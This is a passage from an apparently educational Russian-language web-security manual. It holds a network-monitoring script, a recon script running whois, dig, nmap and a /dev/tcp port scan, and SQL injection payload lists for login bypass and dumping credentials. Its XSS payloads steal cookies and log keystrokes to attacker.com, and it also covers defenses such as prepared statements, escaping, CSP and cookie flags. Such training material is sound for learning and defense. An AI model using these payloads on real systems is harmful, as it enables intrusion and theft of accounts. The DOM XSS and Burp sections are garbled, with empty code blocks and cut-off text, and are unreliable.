    echo -e "\n  ${GREEN}УРОВЕНЬ УГРОЗЫ: НИЗКИЙ${NC}"
fi
echo -e "${CYAN}=================================================${NC}"
```

### 2.7 Сетевой мониторинг

```bash
#!/bin/bash
# ==============================================================================
# Мониторинг сетевых соединений
#
# Описание:
#   Отслеживает текущие сетевые соединения, обнаруживает новые,
#   логирует исходящие соединения, оповещает о подозрительной активности.
#
# Использование:
#   ./net_monitor.sh                     # Однократный снимок
#   ./net_monitor.sh --watch             # Непрерывный мониторинг
#   ./net_monitor.sh --log connections.log  # С логированием
#
# Пример вывода:
#   === Сетевой мониторинг: 2024-01-15 10:30:00 ===
#   
#   [СЛУШАЮЩИЕ ПОРТЫ]
#   Порт   Протокол  Процесс        PID
#   22     tcp       sshd           1234
#   80     tcp       nginx          5678
#   443    tcp       nginx          5678
#   
#   [УСТАНОВЛЕННЫЕ СОЕДИНЕНИЯ]
#   Локальный          Удалённый           Процесс
#   :22                45.33.32.1:54321    sshd
#   :443               10.0.0.5:38912      nginx
# ==============================================================================

set -uo pipefail

# Настройки
WATCH_MODE=false
LOG_FILE=""
INTERVAL=5

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Разбор аргументов
while [[ $# -gt 0 ]]; do
    case $1 in
        --watch)    WATCH_MODE=true; shift ;;
        --log)      LOG_FILE="$2"; shift 2 ;;
        --interval) INTERVAL="$2"; shift 2 ;;
        -h|--help)
            echo "Использование: $0 [--watch] [--log ФАЙЛ] [--interval СЕК]"
            exit 0
            ;;
        *) shift ;;
    esac
done

вывод() {
    echo -e "$1"
    if [[ -n "$LOG_FILE" ]]; then
        echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG_FILE"
    fi
}

# Слушающие порты
показать_слушающие() {
    вывод "\n${CYAN}[СЛУШАЮЩИЕ ПОРТЫ]${NC}"
    printf "  %-8s %-10s %-16s %s\n" "Порт" "Протокол" "Процесс" "PID"
    echo "  --------------------------------------------------------"

    ss -tlunp 2>/dev/null | tail -n +2 | while IFS= read -r line; do
        local proto port process pid
        proto=$(echo "$line" | awk '{print $1}')
        port=$(echo "$line" | awk '{print $5}' | rev | cut -d: -f1 | rev)
        process=$(echo "$line" | grep -oP 'users:\(\("\K[^"]+' 2>/dev/null || echo "-")
        pid=$(echo "$line" | grep -oP 'pid=\K[0-9]+' 2>/dev/null || echo "-")
        printf "  %-8s %-10s %-16s %s\n" "$port" "$proto" "$process" "$pid"
    done
}

# Установленные соединения
показать_соединения() {
    вывод "\n${CYAN}[УСТАНОВЛЕННЫЕ СОЕДИНЕНИЯ]${NC}"
    printf "  %-22s %-22s %s\n" "Локальный" "Удалённый" "Процесс"
    echo "  ----------------------------------------------------------------"

    ss -tunp state established 2>/dev/null | tail -n +2 | while IFS= read -r line; do
        local local_addr remote_addr process
        local_addr=$(echo "$line" | awk '{print $4}')
        remote_addr=$(echo "$line" | awk '{print $5}')
        process=$(echo "$line" | grep -oP 'users:\(\("\K[^"]+' 2>/dev/null || echo "-")
        printf "  %-22s %-22s %s\n" "$local_addr" "$remote_addr" "$process"
    done
}

# Статистика соединений
показать_статистику() {
    вывод "\n${CYAN}[СТАТИСТИКА]${NC}"

    local established listening close_wait time_wait
    established=$(ss -tun state established 2>/dev/null | tail -n +2 | wc -l)
    listening=$(ss -tlun 2>/dev/null | tail -n +2 | wc -l)
    close_wait=$(ss -tun state close-wait 2>/dev/null | tail -n +2 | wc -l)
    time_wait=$(ss -tun state time-wait 2>/dev/null | tail -n +2 | wc -l)

    вывод "  Установленных: $established"
    вывод "  Слушающих: $listening"
    вывод "  CLOSE_WAIT: $close_wait"
    вывод "  TIME_WAIT: $time_wait"

    # Уникальные удалённые IP
    local unique_ips
    unique_ips=$(ss -tun state established 2>/dev/null | tail -n +2 \
        | awk '{print $5}' | rev | cut -d: -f2- | rev | sort -u | wc -l)
    вывод "  Уникальных удалённых IP: $unique_ips"

    # Топ подключённых IP
    вывод "\n  Топ-5 удалённых IP:"
    ss -tun state established 2>/dev/null | tail -n +2 \
        | awk '{print $5}' | rev | cut -d: -f2- | rev \
        | sort | uniq -c | sort -rn | head -5 \
        | while read -r count ip; do
            printf "    %-20s %s соединений\n" "$ip" "$count"
        done
}

# Основной вывод
выполнить_мониторинг() {
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    вывод "\n${CYAN}=== Сетевой мониторинг: $timestamp ===${NC}"

    показать_слушающие
    показать_соединения
    показать_статистику

    вывод "\n${CYAN}============================================${NC}"
}

# Запуск
if $WATCH_MODE; then
    echo "[*] Непрерывный мониторинг (Ctrl+C для выхода)"
    echo "[*] Интервал: ${INTERVAL} сек"
    while true; do
        clear
        выполнить_мониторинг
        sleep "$INTERVAL"
    done
else
    выполнить_мониторинг
fi
```

### 2.8 Автоматизация разведки (Recon Script)

```bash
#!/bin/bash
# ==============================================================================
# Автоматизированная разведка (Recon Automation)
#
# Описание:
#   Собирает информацию о целевом домене/IP из открытых источников.
#   Использует whois, dig, nmap, и другие инструменты.
#   Генерирует структурированный отчёт.
#
# Использование:
#   ./recon.sh example.com
#   ./recon.sh 192.168.1.1
#   ./recon.sh example.com --full
#
# Пример вывода:
#   === Разведка: example.com ===
#   
#   [WHOIS] Регистратор: MarkMonitor Inc.
#   [WHOIS] Создан: 1995-08-14
#   [DNS] A: 93.184.216.34
#   [DNS] MX: mail.example.com
#   [DNS] NS: ns1.example.com, ns2.example.com
#   [ПОРТЫ] 80/tcp (http), 443/tcp (https)
# ==============================================================================

set -uo pipefail

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Проверка аргументов
if [[ $# -lt 1 ]]; then
    echo "Использование: $0 ДОМЕН_ИЛИ_IP [--full]"
    exit 1
fi

TARGET="$1"
FULL_SCAN=false
[[ "${2:-}" == "--full" ]] && FULL_SCAN=true

REPORT_DIR="./recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$REPORT_DIR"

REPORT_FILE="${REPORT_DIR}/report.txt"

# Функции
лог() { echo -e "$1" | tee -a "$REPORT_FILE"; }

# === WHOIS ===
разведка_whois() {
    лог "\n${YELLOW}[1/6] WHOIS информация${NC}\n"

    if command -v whois &>/dev/null; then
        whois "$TARGET" > "${REPORT_DIR}/whois.txt" 2>/dev/null

        local registrar creation expiration
        registrar=$(grep -i "Registrar:" "${REPORT_DIR}/whois.txt" | head -1 | cut -d: -f2- | xargs)
        creation=$(grep -iE "(Creation Date|Created)" "${REPORT_DIR}/whois.txt" | head -1 | cut -d: -f2- | xargs)
        expiration=$(grep -iE "(Expiry|Expiration)" "${REPORT_DIR}/whois.txt" | head -1 | cut -d: -f2- | xargs)

        [[ -n "$registrar" ]]  && лог "  Регистратор: $registrar"
        [[ -n "$creation" ]]   && лог "  Создан: $creation"
        [[ -n "$expiration" ]] && лог "  Истекает: $expiration"

        # Email из WHOIS
        grep -ioP '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' "${REPORT_DIR}/whois.txt" \
            | sort -u | head -5 \
            | while read -r email; do
                лог "  Email: $email"
            done
    else
        лог "  [!] whois не установлен"
    fi
}

# === DNS ===
разведка_dns() {
    лог "\n${YELLOW}[2/6] DNS записи${NC}\n"

    if command -v dig &>/dev/null; then
        for rtype in A AAAA MX NS TXT SOA CNAME; do
            local result
            result=$(dig +short "$TARGET" "$rtype" 2>/dev/null)
            if [[ -n "$result" ]]; then
                лог "  ${rtype}:"
                echo "$result" | while IFS= read -r line; do
                    лог "    $line"
                done
            fi
        done

        # Сохраняем полный вывод
        dig ANY "$TARGET" > "${REPORT_DIR}/dns_full.txt" 2>/dev/null
    elif command -v nslookup &>/dev/null; then
        nslookup "$TARGET" > "${REPORT_DIR}/dns.txt" 2>/dev/null
        лог "  $(cat "${REPORT_DIR}/dns.txt")"
    else
        лог "  [!] dig/nslookup не установлены"
    fi
}

# === IP ИНФОРМАЦИЯ ===
разведка_ip() {
    лог "\n${YELLOW}[3/6] IP информация${NC}\n"

    # Разрешаем имя в IP
    local ip
    ip=$(dig +short "$TARGET" A 2>/dev/null | head -1)
    [[ -z "$ip" ]] && ip="$TARGET"

    лог "  IP-адрес: $ip"

    # Обратная DNS-запись
    local reverse
    reverse=$(dig +short -x "$ip" 2>/dev/null)
    [[ -n "$reverse" ]] && лог "  Обратная DNS: $reverse"

    # Traceroute (только первые 10 хопов)
    if $FULL_SCAN && command -v traceroute &>/dev/null; then
        лог "\n  Traceroute (первые 10 хопов):"
        traceroute -m 10 "$ip" 2>/dev/null \
            | tail -n +2 \
            | while IFS= read -r line; do
                лог "    $line"
            done
    fi
}

# === СКАНИРОВАНИЕ ПОРТОВ ===
разведка_порты() {
    лог "\n${YELLOW}[4/6] Сканирование портов${NC}\n"

    if command -v nmap &>/dev/null; then
        if $FULL_SCAN; then
            лог "  Режим: полное сканирование (может занять время)..."
            nmap -sV --top-ports 1000 -T4 "$TARGET" \
                -oN "${REPORT_DIR}/nmap_scan.txt" > /dev/null 2>&1
        else
            лог "  Режим: быстрое сканирование..."
            nmap --top-ports 100 -T4 "$TARGET" \
                -oN "${REPORT_DIR}/nmap_scan.txt" > /dev/null 2>&1
        fi

        # Показываем открытые порты
        grep "^[0-9]" "${REPORT_DIR}/nmap_scan.txt" 2>/dev/null \
            | while IFS= read -r line; do
                лог "  $line"
            done
    else
        лог "  [!] nmap не установлен"
        лог "  Пробуем базовое сканирование через bash..."
        for port in 21 22 23 25 53 80 110 143 443 445 993 995 3306 3389 5432 8080 8443; do
            (echo >/dev/tcp/"$TARGET"/"$port") 2>/dev/null && лог "  Порт $port: ОТКРЫТ"
        done
    fi
}

# === ВЕБЕРЕЧИСЛЕНИЕ ===
разведка_веб() {
    лог "\n${YELLOW}[5/6] Веб-информация${NC}\n"

    # Проверяем HTTP заголовки
    if command -v curl &>/dev/null; then
        for scheme in http https; do
            local headers
            headers=$(curl -sI -m 10 "${scheme}://${TARGET}" 2>/dev/null)
            if [[ -n "$headers" ]]; then
                лог "  ${scheme^^}:"
                local server
                server=$(echo "$headers" | grep -i "^Server:" | head -1 | cut -d: -f2- | xargs)
                [[ -n "$server" ]] && лог "    Сервер: $server"

                local powered
                powered=$(echo "$headers" | grep -i "^X-Powered-By:" | head -1 | cut -d: -f2- | xargs)
                [[ -n "$powered" ]] && лог "    X-Powered-By: $powered"

                echo "$headers" > "${REPORT_DIR}/headers_${scheme}.txt"
            fi
        done

        # Проверяем robots.txt
        local robots
        robots=$(curl -sL -m 10 "http://${TARGET}/robots.txt" 2>/dev/null)
        if [[ -n "$robots" ]] && ! echo "$robots" | grep -qi "404\|not found"; then
            лог "\n  robots.txt найден:"
            echo "$robots" | head -20 | while IFS= read -r line; do
                лог "    $line"
            done
            echo "$robots" > "${REPORT_DIR}/robots.txt"
        fi
    fi
}

# === СВОДКА ===
сводка() {
    лог "\n${YELLOW}[6/6] СВОДКА${NC}\n"
    лог "  Каталог отчёта: $REPORT_DIR"
    лог "  Файлы:"
    ls -la "$REPORT_DIR" | tail -n +4 | while IFS= read -r line; do
        лог "    $line"
    done
}

# === ЗАПУСК ===
лог "${CYAN}=================================================${NC}"
лог "${CYAN}  Автоматизированная разведка${NC}"
лог "${CYAN}  Цель: $TARGET${NC}"
лог "${CYAN}  Режим: $(if $FULL_SCAN; then echo 'Полный'; else echo 'Быстрый'; fi)${NC}"
лог "${CYAN}  Дата: $(date '+%Y-%m-%d %H:%M:%S')${NC}"
лог "${CYAN}=================================================${NC}"

разведка_whois
разведка_dns
разведка_ip
разведка_порты
разведка_веб
сводка

лог "\n${GREEN}[*] Разведка завершена!${NC}"
лог "${GREEN}[*] Отчёт: ${REPORT_FILE}${NC}"
```

### 3.1 Базовые SQL-инъекции

#### Обход аутентификации (Authentication Bypass)

```
Поле логина: ' OR '1'='1' --
Поле пароля: anything

Как это работает:
Исходный запрос:
    SELECT * FROM users WHERE username='ВВОД' AND password='ВВОД';

После инъекции:
    SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything';

Объяснение:
  - ' закрывает строку username
  - OR '1'='1' всегда истинно (TRUE)
  - -- комментирует остаток запроса (проверку пароля)
  - Результат: запрос возвращает ВСЕХ пользователей
```

#### Другие варианты обхода аутентификации

```
' OR 1=1 --
' OR 'a'='a
') OR ('1'='1
admin' --
admin' #
admin'/*
' OR 1=1 LIMIT 1 --
' UNION SELECT 1, 'admin', 'password' --
```

#### UNION-based инъекция

```
Описание: Используется оператор UNION для извлечения данных из других таблиц.

Шаг 1: Определяем количество столбцов
    ' ORDER BY 1 --     (успех)
    ' ORDER BY 2 --     (успех)
    ' ORDER BY 3 --     (успех)
    ' ORDER BY 4 --     (ошибка -> значит 3 столбца)

Шаг 2: Определяем какие столбцы выводятся
    ' UNION SELECT 1,2,3 --
    (смотрим какие числа появились на странице)

Шаг 3: Извлекаем данные
    Версия БД:
    ' UNION SELECT 1, version(), 3 --

    Имена таблиц:
    ' UNION SELECT 1, table_name, 3 FROM information_schema.tables
      WHERE table_schema=database() --

    Столбцы таблицы:
    ' UNION SELECT 1, column_name, 3 FROM information_schema.columns
      WHERE table_name='users' --

    Данные пользователей:
    ' UNION SELECT 1, username, password FROM users --

    Все данные через конкатенацию:
    ' UNION SELECT 1, CONCAT(username,':',password), 3 FROM users --
```

#### Error-based инъекция (извлечение через ошибки)

```
Описание: Информация извлекается через сообщения об ошибках СУБД.

MySQL:
    ' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) --
    ' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1) --

PostgreSQL:
    ' AND 1=CAST((SELECT version()) AS int) --

MSSQL:
    ' AND 1=CONVERT(int, (SELECT @@version)) --
```

#### Blind SQL-инъекция (Boolean-based)

```
Описание: Данные извлекаются посимвольно на основе TRUE/FALSE ответов.
Если TRUE - страница отображается нормально.
Если FALSE - страница отличается (или пустая).

Проверяем первый символ имени базы данных:
    ' AND SUBSTRING(database(),1,1)='a' --   (FALSE)
    ' AND SUBSTRING(database(),1,1)='b' --   (FALSE)
    ...
    ' AND SUBSTRING(database(),1,1)='d' --   (TRUE! Первый символ: d)

Проверяем второй символ:
    ' AND SUBSTRING(database(),2,1)='a' --
    ...

Автоматизация через бинарный поиск (ASCII):
    ' AND ASCII(SUBSTRING(database(),1,1)) > 100 --   (TRUE)
    ' AND ASCII(SUBSTRING(database(),1,1)) > 110 --   (FALSE)
    ' AND ASCII(SUBSTRING(database(),1,1)) > 105 --   (TRUE)
    ...и так далее до точного значения
```

#### Blind SQL-инъекция (Time-based)

```
Описание: Если нет видимой разницы в ответе, используем задержки.
Если условие TRUE - сервер задерживает ответ.

MySQL:
    ' AND IF(1=1, SLEEP(5), 0) --
    (Задержка 5 секунд = инъекция работает)

    ' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0) --
    (Задержка = первый символ БД - 'd')

PostgreSQL:
    '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

MSSQL:
    '; IF (1=1) WAITFOR DELAY '0:0:5' --
```

```java
// String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");

// ПРАВИЛЬНО (PreparedStatement):
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

## ЧАСТЬ 4: ПРИМЕРЫ XSS АТАК (УЧЕБНЫЕ)

### 4.1 Reflected XSS (Отражённый XSS)

```
Описание: Вредоносный скрипт передаётся через URL или параметр запроса
и отражается в ответе сервера без надлежащей обработки.

--- Базовые примеры ---

Простой alert:
    <script>alert('XSS')</script>

В параметре URL:
    http://site.com/search?q=<script>alert('XSS')</script>

Через обработчики событий:
    <img src=x onerror="alert('XSS')">
    <svg onload="alert('XSS')">
    <body onload="alert('XSS')">
    <input onfocus="alert('XSS')" autofocus>

--- Кража cookies ---

Описание: Злоумышленник получает cookie-файлы жертвы.

    <script>
    new Image().src = "http://attacker.com/steal?c=" + document.cookie;
    </script>

    <script>
    fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
    </script>

Почему это опасно:
    - Cookie может содержать сессионный идентификатор
    - Злоумышленник может украсть сессию (Session Hijacking)
    - Получить доступ к аккаунту жертвы

--- Внедрение кейлоггера ---

    <script>
    document.onkeypress = function(e) {
        new Image().src = "http://attacker.com/log?k=" + e.key;
    };
    </script>
```

### 4.2 Stored XSS (Сохранённый XSS)

```
Описание: Вредоносный скрипт сохраняется на сервере (в БД) и
выполняется у КАЖДОГО пользователя, который просматривает страницу.

--- Инъекция через форму комментариев ---

Поле комментария:
    Отличная статья!<script>alert('XSS')</script>

    <script>
    // Перенаправление на фишинговый сайт
    window.location = 'http://attacker.com/phishing';
    </script>

--- Инъекция через поле профиля ---

Поле "О себе":
    Привет! <img src=x onerror="alert(document.cookie)">

Поле "Имя пользователя":
    user<script>alert('XSS')</script>name

--- Инъекция через тег изображения ---

Поле аватара (URL):
    javascript:alert('XSS')

    " onerror="alert('XSS')" "

Почему Stored XSS опаснее Reflected:
    - Не требует специально подготовленной ссылки
    - Атакует всех посетителей страницы
    - Может долго оставаться незамеченным
    - Один раз внедрили - работает постоянно
```

### 4.3 DOM-based XSS

```
Описание: Скрипт выполняется в DOM браузера без отправки на сервер.
Уязвимый JavaScript-код обрабатывает данные из URL напрямую.

--- Уязвимый код ---

<script>

Эксплуатация:

    <script>
    var url = document.location.href;

Эксплуатация:
    http://site.com/page?name=<script>alert('XSS')</script>

Уязвимый код:
    <script>

    </script>

Эксплуатация:

Частые источники DOM XSS (sources):
    - document.location
    - document.URL
    - document.referrer
    - window.name
    - location.hash
    - location.search

Частые приёмники (sinks):
    - innerHTML
    - document.write()
    - eval()
    - setTimeout() / setInterval()
    - element.src
```

### 4.4 Защита от XSS

#### Экранирование вывода (Output Encoding)

```python
# Python: экранирование HTML
import html

user_input = '<script>alert("XSS")</script>'
safe_output = html.escape(user_input)
# Результат: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

# В шаблонизаторе Jinja2 (экранирование автоматическое):
# {{ user_input }}  -- автоматически экранируется
# {{ user_input|safe }}  -- НЕ экранируется (опасно!)
```

```javascript
// JavaScript: безопасная вставка текста
// НЕПРАВИЛЬНО (уязвимо):
// element.innerHTML = userInput;

// ПРАВИЛЬНО:
element.textContent = userInput;

// Или экранирование:
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}
```

#### Content Security Policy (CSP)

```
Заголовок HTTP:
    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src *;

Объяснение:
    default-src 'self'   - по умолчанию загрузка только с текущего домена
    script-src 'self'    - скрипты только с текущего домена (блокирует inline!)
    style-src 'self'     - стили с текущего домена
    img-src *            - изображения с любого источника

Строгая политика:
    Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; base-uri 'self'; form-action 'self';

В HTML (meta-тег):
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; script-src 'self';">
```

#### Флаги Cookie

```
Для защиты cookie от кражи через XSS:

Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly  - cookie НЕ доступен через JavaScript (document.cookie)
Secure    - cookie отправляется только по HTTPS
SameSite  - защита от CSRF:
    Strict - cookie не отправляется при переходе с другого сайта
    Lax    - отправляется только при навигации (GET)
    None   - всегда отправляется (требует Secure)
```

```
  - Обход проверок авторизации
  - Тестирование API

  1. Send to Intruder из Proxy

  4. Start Attack

Примеры:
  - Перебор паролей (Sniper: поле password)
```
